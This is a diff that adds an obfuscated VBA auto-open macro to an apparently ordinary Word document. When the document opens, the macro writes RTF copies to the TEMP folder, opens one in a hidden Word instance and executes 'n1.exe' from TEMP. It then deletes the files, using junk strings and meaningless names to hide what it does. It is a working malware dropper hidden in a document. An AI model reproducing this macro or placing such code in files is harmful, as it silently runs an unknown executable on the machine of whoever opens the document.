@@ -1,0 +1,66 @@
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Sub JIjashdjkasd_Open()
+    NQJKHDJAKSD = "askjd askljdasjhdjkashdjkasd hkasd "
+End Sub
+Sub AutoOpen()
+    QJHKDAJSD = "qjdilqwhdalskjdkalsjd askldjas ldjas"
+    Auto_Open
+End Sub
+Sub Indefrakks()
+On Error Resume Next
+TMP = Environ$("TEMP") + "\"
+TEX = TMP + "n1." & "ex"
+TCA = TMP + "300.rtf"
+TCB = TMP + "301.rtf"
+TEX = TEX + "e"
+
+SaveAsRTF (TCA)
+SaveAsRTF (TCB)
+Sameit (2)
+Set sttKaka = CreateObject("Word.Application")
+sttKaka.Visible = False
+Set docWord = sttKaka.Documents.Open(TCA)
+Sameit (2)
+Shell (TEX)
+Sameit (1)
+sttKaka.Quit
+Set sttKaka = Nothing
+Kill TCA
+Kill TEX
+End Sub
+Sub Magitinal()
+    QHWKJDHASJDH = "asjhd kasjdlkqjwdilqw hdjkasdhas d"
+    Indefrakks
+End Sub
+Sub Workbook_Open()
+    HQKJASNDSA = "asjdk jksdhasdjkashdlkjlsa dahjskdas"
+    Magitinal
+End Sub
+Sub Sameit(Kalamana As Long)
+Dim Jhbhds As Long
+Jhbhds = Timer + Kalamana
+Do While Timer < Jhbhds
+DoEvents
+Loop
+End Sub
+Public Function SaveAsRTF(Name As String)
+    ActiveDocument.SaveAs FileName:=Name, FileFormat:=wdFormatRTF
+End Function
+Sub Auto_Open()
+    Magitinal
+    QUKDHASD = "asjdlaksj dlkasjd kashjd as"
+End Sub
+
+
+
+
+
+
+
